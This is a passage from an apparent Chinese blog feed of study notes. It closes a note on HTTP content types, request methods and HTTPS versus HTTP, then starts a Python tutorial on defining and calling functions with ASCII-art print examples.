是什么内容。两个content-type，第一个在头部的告诉客户端我要用表单上传文件，第二个在响应正文中表示上传的文件类型</p></li><li><p>消息主体里按照字段个数又分为多个结构类似的部分，每部分都是以 —–boundary 开始</p></li><li><p>紧接着内容描述信息，然后是回车，最后是字段具体内容（文本或二进制）。</p></li><li><p>如果传输的是文件，还要包含文件名和文件类型信息。</p></li><li><p>消息主体最后以 ——boundary– 标示结束。</p></li></ol></blockquote><h5 id="关于conetnt-disposition的解释："><a href="#关于conetnt-disposition的解释：" class="headerlink" title="关于conetnt-disposition的解释："></a><strong>关于conetnt-disposition的解释：</strong></h5><p><code>conetnt-disposition</code>就是定义文件内容呈现方式，在不同位置有不同的用法具体可参考链接的解释:</p><blockquote><blockquote><ul><li><a href="https://blog.csdn.net/Winnycatty/article/details/84554487">http上传&#x2F;下载文件时，Content-Disposition的使用</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition">Content-Disposition</a></li></ul></blockquote><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition#%E4%BD%9C%E4%B8%BA%E6%B6%88%E6%81%AF%E4%B8%BB%E4%BD%93%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E5%A4%B4"><strong>作为消息主体中的消息头</strong></a></li></ul><p>在常规的 HTTP 应答中，Content-Disposition 响应头指示回复的内容该<strong>以何种形式展示</strong>，是以<strong>内联的形式（即网页或者页面的一部分</strong>），还是<strong>以附件的形式下载并保存到本地</strong>。</p><p>在 HTTP 场景中，第一个参数或者是 inline（默认值，表示回复中的消息体会<strong>以页面的一部分或者整个页面的形式展示</strong>），或者是 attachment（意味着消息体应该被<strong>下载到本地</strong>；大多数浏览器会呈现一个“保存为”的对话框，将 filename 的值预填为下载后的文件名，假如它存在的话）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: inline</span><br><span class="line">Content-Disposition: attachment</span><br><span class="line">Content-Disposition: attachment; filename=&quot;filename.jpg&quot;</span><br></pre></td></tr></table></figure><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition#%E4%BD%9C%E4%B8%BAmultipart_body%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E5%A4%B4"><strong>作为 multipart body 中的消息头</strong></a></li></ul><p>在 HTTP 场景中。第一个参数总是固定不变的 form-data；附加的参数不区分大小写，并且拥有参数值，参数名与参数值用等号 (‘&#x3D;’) 连接，参数值用双引号括起来。参数之间用分号 (‘;’) 分隔。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data</span><br><span class="line">Content-Disposition: form-data; name=&quot;fieldName&quot;</span><br><span class="line">Content-Disposition: form-data; name=&quot;fieldName&quot;; filename=&quot;filename.jpg&quot;</span><br></pre></td></tr></table></figure><p>Content-disposition是 MIME 协议的扩展，MIME 协议指示 MIME 用户代理如何显示附加的文件。如图中的，当 Internet Explorer 接收到头时，它会<strong>激活文件下载对话框</strong>，<strong>它的文件名框自动填充了头中指定的文件名</strong>。（请注意，这是设计导致的；无法使用此功能将文档保存到用户的计算机上，而不向用户询问保存位置。）</p></blockquote></blockquote><h4 id="x-www-form-urlencoded-raw"><a href="#x-www-form-urlencoded-raw" class="headerlink" title="x-www-form-urlencoded(raw)"></a><code>x-www-form-urlencoded(raw)</code></h4><blockquote><p>可以上传任意格式的文本，可以上传text、json、xml、html等<br>content-type&#x3D; text&#x2F;html（HTML 文档）；text&#x2F;plain（纯文本）；text&#x2F;css（CSS 样式表）；application&#x2F;json (json字符串)</p><h5 id="application-json"><a href="#application-json" class="headerlink" title="application/json"></a><code>application/json</code></h5><blockquote><p>在响应头中很常见，在请求头中用来告诉服务端消息主体是序列化后的json字符串。</p></blockquote></blockquote><h4 id="application-octet-stream"><a href="#application-octet-stream" class="headerlink" title="application/octet-stream"></a><code>application/octet-stream</code></h4><blockquote><p>从字面意思得知，只可以上传二进制数据，通常用来上传文件，由于没有键值，所以，一次只能上传一个文件。</p></blockquote><h3 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h3><blockquote><p>HEAD：请求获取由Request-URI所标识的资源的响应消息报头首部，不会返回报文主体</p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210010039520.png" alt="image-20221001003809242"></p><h3 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h3><blockquote><p>OPTIONS：查询资源支持的方法。</p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210010048426.png" alt="image-20221001004812048"></p><h3 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h3><p>PUT：请求服务器存储一个资源，并用Request-URI作为其标识服务器会将请求主体的内容保存到URL指定的资源位置，包含两种情况：</p><ol><li><p>URL指定的资源不存在，服务器会新建一个文件，将请求主体中的内容保存到新建的文件里，响应码为201。</p></li><li><p>URL指定的资源存在，服务器会重置文件内容，用请求主体中的内容覆盖原文件内容，响应码为200或204。</p></li></ol><blockquote><p>PUT方法自身不带验证机制，任何人都可以执行，存在安全问题，所以网站一般不会使用PUT方法。</p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210010048091.png" alt="image-20221001004827692"></p><h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><p>DELETE：请求服务器<strong>删除Request-URI所标识的资源</strong></p><blockquote><p>和PUT一样，DELETE方法同样不带验证机制，所以网站一般也不使用DELETE方法。</p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210010050022.png" alt="image-20221001004920098"></p><h3 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h3><p>TRACE：路径追踪，请求服务器回送收到的请求信息，主要用于<strong>测试或诊断发送的请求是否在客户端与服务端之间传送时被网关、防火墙、代理更改</strong>。</p><h2 id="HTTPS与HTTP"><a href="#HTTPS与HTTP" class="headerlink" title="HTTPS与HTTP"></a>HTTPS与HTTP</h2><h3 id="HTTP与HTTPS的区别"><a href="#HTTP与HTTPS的区别" class="headerlink" title="HTTP与HTTPS的区别"></a>HTTP与HTTPS的区别</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210160458138.png" alt="图片" style="zoom: 50%;" /><ol><li><p>HTTP 是超文本传输协议，信息是明文传输，存在安全风险的问题。HTTPS 则解决 HTTP 不安全的缺陷，在 TCP 和 HTTP 网络层之间加入了 SSL&#x2F;TLS 安全协议，使得报文能够加密传输。</p></li><li><p>HTTP 连接建立相对简单， TCP 三次握手之后便可进行 HTTP 的报文传输。而HTTPS 在 TCP 三次握手之后，还需进行 SSL&#x2F;TLS 的握手过程，才可进入加密报文传输。HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL&#x2F;TLS之上，SSL&#x2F;TLS运行在TCP之上，所有传输的内容都经过加密的。</p><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210160501604.png" alt="image-20221016050139257" style="zoom:50%;" /></blockquote></li><li><p>HTTP 的端口号是 80，HTTPS 的端口号是 443。</p></li><li><p>HTTPS 协议需要向 CA（证书权威机构）申请数字证书，来保证服务器的身份是可信的。一般免费证书很少，需要交费。</p></li><li><p>HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题</p></li></ol><h3 id="HTTPS解决的问题"><a href="#HTTPS解决的问题" class="headerlink" title="HTTPS解决的问题"></a>HTTPS解决的问题</h3><p>HTTP 由于是明文传输，所以安全上存在以下三个风险：</p><ul><li>窃听风险，比如通信链路上可以获取通信内容，用户号容易没。</li><li>篡改风险，比如强制入垃圾广告，视觉污染，用户眼容易瞎。</li><li>冒充风险，比如冒充淘宝网站，用户钱容易没。</li></ul><p>HTTPS 在 HTTP 与 TCP 层之间加入了 SSL&#x2F;TLS 协议。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210010056682.png" alt="image-20221001005523336" style="zoom:50%;" /><p>可以很好的解决了上述的风险：</p><ul><li>信息加密：交互信息无法被窃取，但你的号会因为「自身忘记」账号而没。</li><li>校验机制：无法篡改通信内容，篡改了就不能正常显示，但百度「竞价排名」依然可以搜索垃圾广告。</li><li>身份证书：证明淘宝是真的淘宝网，但你的钱还是会因为「剁手」而没。</li></ul><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><blockquote><ul><li><a href="https://www.mozhe.cn/">https://www.mozhe.cn/</a> </li><li><a href="https://www.mozhe.cn/bug/N2dmMnp1b1VYd2EzLzBNR3MvRVlIZz09bW96aGUmozhe">https://www.mozhe.cn/bug/N2dmMnp1b1VYd2EzLzBNR3MvRVlIZz09bW96aGUmozhe</a></li><li><a href="https://www.cnblogs.com/WUXIAOCHANG/p/11024351.html">form-data、x-www-form-urlencoded、raw、binary的区别（非原创） - 故事爱人 - 博客园 (cnblogs.com)</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4. 函数</title>
      <link href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/4.%20%E5%87%BD%E6%95%B0.html"/>
      <url>/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/4.%20%E5%87%BD%E6%95%B0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是函数"><a href="#什么是函数" class="headerlink" title="什么是函数"></a>什么是函数</h1><p>函数：一个功能独立的代码块</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个函数，能够完成打印信息的功能</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_info</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;         人生苦短，我用Python         &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><p>函数在编程中是非常重要的一个知识点，大体功能如下</p><ul><li>能够将部分代码划分为一个整体的功能</li><li>只需定义函数1次就可以使用N次，可以大大减少了代码的冗余</li><li>代码看上去更加整洁美观</li></ul><h2 id="示例一：未使用函数的情况"><a href="#示例一：未使用函数的情况" class="headerlink" title="示例一：未使用函数的情况"></a>示例一：未使用函数的情况</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出第1遍 佛祖镇楼</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                            _ooOoo_  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                           o8888888o  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                           88  .  88  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                           (| -_- |)  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                            O\\ = /O  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                        ____/`---&#x27;\\____  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                      .   &#x27; \\| |// `.  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                       / \\||| : |||// \\  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                     / _||||| -:- |||||- \\  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                       | | \\\\\\ - /// | |  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                     | \\_| &#x27;&#x27;\\---/&#x27;&#x27; | |  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                      \\ .-\\__ `-` ___/-. /  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                   ___`. .&#x27; /--.--\\ `. . __  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                .&quot;</span><span class="string">&quot; &#x27;&lt; `.___\\_&lt;|&gt;_/___.&#x27; &gt;&#x27;&quot;</span><span class="string">&quot;.  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;               | | : `- \\`.;`\\ _ /`;.`/ - ` : | |  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                 \\ \\ `-. \\_ __\\ /__ _/ .-` / /  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;         ======`-.____`-.___\\_____/___.-`____.-&#x27;======  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                            `=---=&#x27;  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;         .............................................  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  佛祖镇楼                  BUG辟易  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;          佛曰:  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  写字楼里写字间，写字间里程序员；  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  程序人员写程序，又拿程序换酒钱。  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  酒醒只在网上坐，酒醉还来网下眠；  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  酒醉酒醒日复日，网上网下年复年。  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  但愿老死电脑间，不愿鞠躬老板前；  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  奔驰宝马贵者趣，公交自行程序员。  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  别人笑我忒疯癫，我笑自己命太贱；  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  不见满街漂亮妹，哪个归得程序员？&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出第2遍 佛祖镇楼</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                            _ooOoo_  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                           o8888888o  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                           88  .  88  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                           (| -_- |)  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                            O\\ = /O  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                        ____/`---&#x27;\\____  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                      .   &#x27; \\| |// `.  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                       / \\||| : |||// \\  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                     / _||||| -:- |||||- \\  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                       | | \\\\\\ - /// | |  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                     | \\_| &#x27;&#x27;\\---/&#x27;&#x27; | |  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                      \\ .-\\__ `-` ___/-. /  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                   ___`. .&#x27; /--.--\\ `. . __  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                .&quot;</span><span class="string">&quot; &#x27;&lt; `.___\\_&lt;|&gt;_/___.&#x27; &gt;&#x27;&quot;</span><span class="string">&quot;.  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;               | | : `- \\`.;`\\ _ /`;.`/ - ` : | |  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                 \\ \\ `-. \\_ __\\ /__ _/ .-` / /  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;         ======`-.____`-.___\\_____/___.-`____.-&#x27;======  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                            `=---=&#x27;  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;         .............................................  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  佛祖镇楼                  BUG辟易  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;          佛曰:  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  写字楼里写字间，写字间里程序员；  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  程序人员写程序，又拿程序换酒钱。  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  酒醒只在网上坐，酒醉还来网下眠；  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  酒醉酒醒日复日，网上网下年复年。  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  但愿老死电脑间，不愿鞠躬老板前；  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  奔驰宝马贵者趣，公交自行程序员。  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  别人笑我忒疯癫，我笑自己命太贱；  &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;                  不见满街漂亮妹，哪个归得程序员？&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="示例二：使用函数的情况"><a href="#示例二：使用函数的情况" class="headerlink" title="示例二：使用函数的情况"></a>示例二：使用函数的情况</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个函数，完成了独立输出“佛祖镇楼”的功能</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_fozu</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                            _ooOoo_  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                           o8888888o  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                           88  .  88  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                           (| -_- |)  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                            O\\ = /O  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                        ____/`---&#x27;\\____  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                      .   &#x27; \\| |// `.  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                       / \\||| : |||// \\  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                     / _||||| -:- |||||- \\  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                       | | \\\\\\ - /// | |  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                     | \\_| &#x27;&#x27;\\---/&#x27;&#x27; | |  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                      \\ .-\\__ `-` ___/-. /  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                   ___`. .&#x27; /--.--\\ `. . __  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                .&quot;</span><span class="string">&quot; &#x27;&lt; `.___\\_&lt;|&gt;_/___.&#x27; &gt;&#x27;&quot;</span><span class="string">&quot;.  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;               | | : `- \\`.;`\\ _ /`;.`/ - ` : | |  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                 \\ \\ `-. \\_ __\\ /__ _/ .-` / /  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;         ======`-.____`-.___\\_____/___.-`____.-&#x27;======  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                            `=---=&#x27;  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;         .............................................  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                  佛祖镇楼                  BUG辟易  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;          佛曰:  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                  写字楼里写字间，写字间里程序员；  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                  程序人员写程序，又拿程序换酒钱。  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                  酒醒只在网上坐，酒醉还来网下眠；  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                  酒醉酒醒日复日，网上网下年复年。  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                  但愿老死电脑间，不愿鞠躬老板前；  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                  奔驰宝马贵者趣，公交自行程序员。  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                  别人笑我忒疯癫，我笑自己命太贱；  &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;                  不见满街漂亮妹，哪个归得程序员？&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用2次函数，每次输出1个佛祖镇楼</span></span><br><span class="line">print_fozu()</span><br><span class="line">print_fozu()</span><br></pre></td></tr></table></figure><h1 id="函数分类"><a href="#函数分类" class="headerlink" title="函数分类"></a>函数分类</h1><p>函数根据是否是自己编写可以分为2类</p><ul><li>别人已经写好拿来直接用的函数，成为包括Python内置函数或者第三方包中的函数，更省事</li><li>开发者自己编写的函数（通常称为自定义函数）；根据需要自己编写，更灵活</li></ul><p>在整个函数相关知识学习中，我们主要以研究“自定义函数”为主，当“自定义函数”都弄明白了弄懂了，那么用别人的写好的函数就信手拈来了</p><h1 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h1><p>上面的知识我们知道，函数就是一个独立功能的代码块，想要用函数一定要掌握2块知识</p><ul><li>定义函数（即怎样制作函数）</li><li>调用函数（即怎样使用函数）</li></ul><p>下面我们就来研究函数的定义以及调用</p><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><h5 id="定义函数的格式如下："><a href="#定义函数的格式如下：" class="headerlink" title="定义函数的格式如下："></a>定义函数的格式如下：</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">函数名</span>(<span class="params">形参</span>):</span><br><span class="line">   <span class="comment">#函数体</span></span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>函数名：一定有，按照命名规则起个名字，注意Python中建议使用“小写加下划线”的方式，例如<code>print_info</code>而不用<code>PrintInfo</code></li><li>函数体：一定有，就是整个函数真正要执行的代码，注意函数体前面缩进4个空格</li><li>形参：可有可无，专门用过来存储调用时传递给函数的数据用的</li></ul><h5 id="高版本python的新型函数定义方式："><a href="#高版本python的新型函数定义方式：" class="headerlink" title="高版本python的新型函数定义方式："></a>高版本python的新型函数定义方式：</h5><p>高版本出现函数注释<code>-&gt;</code>这种语法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">ham: <span class="built_in">str</span>, eggs: <span class="built_in">str</span> = <span class="string">&#x27;eggs&#x27;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Annotations:&quot;</span>, f.__annotations__)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Arguments:&quot;</span>, ham, eggs)</span><br><span class="line">    <span class="keyword">return</span> ham + <span class="string">&#x27; and &#x27;</span> + eggs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f(<span class="string">&#x27;spam&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Annotations: &#123;&#x27;ham&#x27;: &lt;class &#x27;str&#x27;&gt;, &#x27;eggs&#x27;: &lt;class &#x27;str&#x27;&gt;, &#x27;return&#x27;: &lt;class &#x27;str&#x27;&gt;&#125;</span></span><br><span class="line"><span class="comment"># Arguments: spam eggs</span></span><br></pre></td></tr></table></figure><p><u><strong><code>-&gt;</code> 主要是标记返回值数据类型</strong></u></p><p>拿上面例子来说，在<strong>函数f</strong>中，标记<strong>参数ham</strong>为<strong>str类型</strong>，<strong>eggs</strong>为<strong>str类型</strong>；return的值为**-&gt;<strong>后面标记的</strong>类型str**。</p><p>这样写的话，我们光看代码就可以知道该方法返回什么类型的数据，而不需要去调试。</p><p>但是如果指定不一致呢，比如说，我们标记f的返回结果为int，但是实际结果却是str。</p><p>此时，开发工具里面应该会报错，提示返回值不对，但是程序照样正常运行，不会抛异常。</p><blockquote><p>参考：<a href="https://www.cnblogs.com/lewic/p/10443573.html">python里的def 方法中-&gt;代表什么意思?</a></p></blockquote><h5 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h5><p>下面定义一个函数，完成打印菜单的功能</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_menu</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;        欢迎光临        &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数字1: 黄瓜炒肉&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数字2: 冬瓜炒肉&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数字3: 西瓜炒肉&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数字4: 南瓜炒肉&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数字5: 北瓜炒肉&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>)</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>函数名:<code>print_menu</code></li><li>函数体：第2~9行的代码</li><li>形参：无</li></ul><p>注意：</p><ul><li>定义了函数，这个函数不会被执行。就好比你发明了一个功能，这个功能不能自己用自己，必须等待别人使用才行，如果想让函数执行，就需要调用函数</li></ul><h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><p>通俗的讲：定义函数相当于打造了一个工具，调用函数相当于使用这个工具完成想要做的事情</p><p>调用函数的格式如下</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">函数名(实参)</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>函数名：一定有，想要调用的函数的名字</li><li>实参：可有可无，调用函数时给它传递的数据</li></ul><p>注意：</p><ul><li>调用的函数的名字必须是先定义好的才能够调用，否则会失败</li></ul><h5 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义了一个函数，实现打印菜单功能</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_menu</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;        欢迎光临        &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数字1: 黄瓜炒肉&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数字2: 冬瓜炒肉&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数字3: 西瓜炒肉&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数字4: 南瓜炒肉&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数字5: 北瓜炒肉&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">print_menu()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">-----------------------</span><br><span class="line">        欢迎光临</span><br><span class="line">数字1: 黄瓜炒肉</span><br><span class="line">数字2: 